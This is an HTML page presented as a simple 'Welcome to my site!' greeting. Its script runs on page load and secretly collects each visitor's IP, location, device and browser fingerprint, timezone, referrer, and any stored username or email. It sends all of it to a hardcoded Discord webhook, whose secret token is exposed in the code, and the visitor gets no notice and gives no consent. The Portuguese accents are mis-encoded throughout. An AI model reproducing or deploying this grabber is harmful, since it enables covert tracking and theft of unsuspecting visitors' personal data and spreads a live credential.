<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enviar Dados do Usu√°rio</title>
</head>
<body>

    <h1>Bem-vindo ao meu site!</h1>

    <script>
        // Fun√ß√£o para gerar um ID √∫nico para cada usu√°rio
        function generateUniqueID() {
            return 'user-' + new Date().getTime() + '-' + Math.floor(Math.random() * 1000);
        }

        // Fun√ß√£o para salvar o ID no LocalStorage (caso o visitante seja recorrente)
        function saveUserID(uniqueID) {
            localStorage.setItem('userID', uniqueID);
        }

        // Fun√ß√£o para pegar o IP do usu√°rio usando uma API p√∫blica
        function getUserData() {
            fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .then(data => {
                    let uniqueID = localStorage.getItem('userID');
                    if (!uniqueID) {
                        uniqueID = generateUniqueID(); 
                        saveUserID(uniqueID);
                    }

                    // Coletar dados do usu√°rio
                    const userData = {
                        uniqueID: uniqueID,
                        ip: data.ip,
                        location: data.city + ', ' + data.region + ', ' + data.country,
                        language: navigator.language,
                        screenRes: screen.width + 'x' + screen.height,
                        userAgent: navigator.userAgent,
                        timeOfAccess: new Date().toISOString(),
                        os: getOperatingSystem(),
                        browser: getBrowser(),
                        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                        deviceType: getDeviceType(),
                        cookiesEnabled: navigator.cookieEnabled,
                        loggedInUser: getLoggedInUser(),
                        referrer: document.referrer,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };

                    // Enviar para o Discord com um texto organizado e esteticamente agrad√°vel
                    sendMessageToDiscord(userData);
                })
                .catch(error => {
                    console.log('Erro ao pegar dados do usu√°rio:', error);
                });
        }

        // Fun√ß√£o para enviar dados para o webhook do Discord com um estilo aprimorado
        function sendMessageToDiscord(userData) {
            const webhookUrl = 'https://discord.com/api/webhooks/1334521184867454987/xtep9Fc8BSv3Vj1cYLBxTKjAitN63OwxoW6EQPFpQ5lv0AqMgpk5P5Ce_O_cRTlVzMjj';

            const message = {
                content: `**üö® Novo Acesso ao Site!** üö®\n\n` +
                         `**üîë ID do Usu√°rio**: ${userData.uniqueID}\n` +
                         `**üåç IP**: ${userData.ip}\n` +
                         `**üìç Localiza√ß√£o**: ${userData.location}\n` +
                         `**üåê Idioma**: ${userData.language}\n` +
                         `**üìè Resolu√ß√£o da Tela**: ${userData.screenRes}\n` +
                         `**üïí Hora do Acesso**: ${userData.timeOfAccess}\n` +
                         `**üñ•Ô∏è Tipo de Dispositivo**: ${userData.deviceType}\n` +
                         `**üîó Refer√™ncia da P√°gina**: ${userData.referrer}\n` +
                         `**üç™ Cookies Habilitados**: ${userData.cookiesEnabled ? 'Sim' : 'N√£o'}\n` +
                         `**üåê Status de Conex√£o**: ${userData.onlineStatus}\n` +
                         `**üñ±Ô∏è Usu√°rio Logado**: ${userData.loggedInUser || 'N√£o logado'}\n` +
                         `**üñ•Ô∏è Sistema Operacional**: ${userData.os}\n` +
                         `**üåê Navegador**: ${userData.browser.name} (${userData.browser.version})\n` +
                         `**‚è∞ Fuso Hor√°rio**: ${userData.timezone}\n\n` +
                         `**üïµÔ∏è‚Äç‚ôÇÔ∏è User-Agent**: ${userData.userAgent}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => {
                if (response.ok) {
                    console.log("Mensagem enviada com sucesso!");
                } else {
                    console.log("Erro ao enviar a mensagem.");
                }
            })
            .catch(error => {
                console.log("Erro ao enviar a mensagem:", error);
            });
        }

        // Fun√ß√£o para obter o Sistema Operacional com base no User-Agent
        function getOperatingSystem() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.indexOf('win') !== -1) {
                if (userAgent.indexOf('windows nt 10.0') !== -1) return 'Windows 10';
                if (userAgent.indexOf('windows nt 6.1') !== -1) return 'Windows 7';
                if (userAgent.indexOf('windows nt 6.2') !== -1) return 'Windows 8';
                if (userAgent.indexOf('windows nt 6.3') !== -1) return 'Windows 8.1';
                return 'Windows';
            }
            if (userAgent.indexOf('mac') !== -1) return 'Mac OS';
            if (userAgent.indexOf('linux') !== -1) return 'Linux';
            if (userAgent.indexOf('android') !== -1) return 'Android';
            if (userAgent.indexOf('iphone') !== -1) return 'iOS';
            return 'Desconhecido';
        }

        // Fun√ß√£o para obter o Navegador com base no User-Agent
        function getBrowser() {
            const userAgent = navigator.userAgent.toLowerCase();
            let name = 'Desconhecido';
            let version = 'Desconhecido';

            if (userAgent.indexOf('chrome') !== -1) {
                name = 'Chrome';
                version = userAgent.match(/chrome\/([\d.]+)/)[1];
            } else if (userAgent.indexOf('firefox') !== -1) {
                name = 'Firefox';
                version = userAgent.match(/firefox\/([\d.]+)/)[1];
            } else if (userAgent.indexOf('safari') !== -1) {
                name = 'Safari';
                version = userAgent.match(/version\/([\d.]+)/)[1];
            } else if (userAgent.indexOf('msie') !== -1 || userAgent.indexOf('trident') !== -1) {
                name = 'Internet Explorer';
                version = userAgent.match(/(msie |rv:)([\d.]+)/)[2];
            }

            return { name: name, version: version };
        }

        // Fun√ß√£o para determinar o tipo de dispositivo (desktop ou mobile)
        function getDeviceType() {
            if (navigator.userAgent.match(/Mobile|Android|iPhone|iPad/)) {
                return 'Mobile';
            } else {
                return 'Desktop';
            }
        }

        // Fun√ß√£o para pegar o usu√°rio logado do localStorage ou sessionStorage
        function getLoggedInUser() {
            const username = localStorage.getItem('username') || sessionStorage.getItem('username');
            const email = localStorage.getItem('email') || sessionStorage.getItem('email');
            if (username) {
                return username;
            } else if (email) {
                return email;
            }
            return null;
        }

        // Enviar os dados assim que a p√°gina for carregada
        window.onload = function() {
            getUserData();
        };
    </script>

</body>
</html>
